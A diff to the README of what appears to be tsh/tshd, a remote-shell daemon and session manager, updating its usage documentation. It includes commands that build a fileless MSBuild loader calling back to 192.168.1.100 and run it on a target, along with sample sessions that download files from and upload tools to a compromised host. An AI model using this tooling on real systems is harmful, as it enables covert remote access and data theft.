@@ -25,6 +25,12 @@ For example, I successfully compiled to the following platforms:
 - solaris
 - windows
 
+## TODO / Known Issues
+
+1. **PowerShell and MSBuild file transfer limitation**: When using `tshdget` and `tshdput` commands inside a PowerShell or MSBuild-loaded shell session, file transfers over 1MB may fail or have connection issues.
+
+2. **Download/Upload command conflict**: The `download <id>` and `upload <id>` commands from the tsh manager menu cannot be used when a session is already running an interactive shell. You will receive a "Session is busy running a shell" error. Use the in-shell commands `tshdget` and `tshdput` instead when inside an active shell session.
+
 ## Usage
 
 ### Compiling
@@ -166,13 +172,13 @@ You can run the C# version "filelessly" by embedding it into an MSBuild XML proj
 1. Generate the loader XML:
 
 ```bash
-python3 tshd-msbuild.py -c 192.168.1.100 -p 1234 -s mysecret -o build/tshd_loader.xml
+python3 tshd-msbuild.py -c 192.168.1.100 -p 1234 -s mysecret -o build/tshd.xml
 ```
 
 2. Run on the target machine (requires .NET Framework 4.0+):
 
 ```cmd
-cmd /c start C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe c:\tshd_loader.xml
+cmd /c start C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe c:\tshd.xml
 ```
 
 
@@ -265,8 +271,8 @@ tsh> upload 2 ./exploit.sh /tmp/exploit.sh
 
 When interacting with a shell session (via `interact <id>`), you can use special commands to transfer files or manage the session without exiting the shell.
 
-*   `tshdget <remote_file> <local_path>`: Download a file from the remote host.
-*   `tshdput <local_path> <remote_path>`: Upload a file to the remote host.
+*   `tshdget`: Download a file from the remote host (interactive prompts for paths).
+*   `tshdput`: Upload a file to the remote host (interactive prompts for paths).
 *   `tshdbg`: Detach from the current session (keep it running in background) and return to the `tsh` manager menu.
 *   `tshdexit`: Force terminate the remote daemon process.
 
@@ -277,10 +283,22 @@ tsh> interact 1
 [*] Interacting with session 1...
 user@host:~$ ls
 file.txt
-user@host:~$ tshdget file.txt ./local_file.txt
+user@host:~$ tshdget
+
+[tshdget] Source Path: file.txt
+
+[tshdget] Local Destination Path: ./local_file.txt
+
+Downloading 'file.txt' to './local_file.txt'...
 Downloading 100% |████████████████████| ( 100 B/ 100 B, 1.0 MB/s)
 Done.
-user@host:~$ tshdput ./local_tool /tmp/tool
+user@host:~$ tshdput
+
+[tshdput] Local Source Path: ./local_tool
+
+[tshdput] Remote Destination Path: /tmp/tool
+
+Uploading './local_tool' to '/tmp/tool'...
 Uploading 100% |████████████████████| ( 5.0 kB/ 5.0 kB, 2.0 MB/s)
 Done.
 user@host:~$ tshdbg
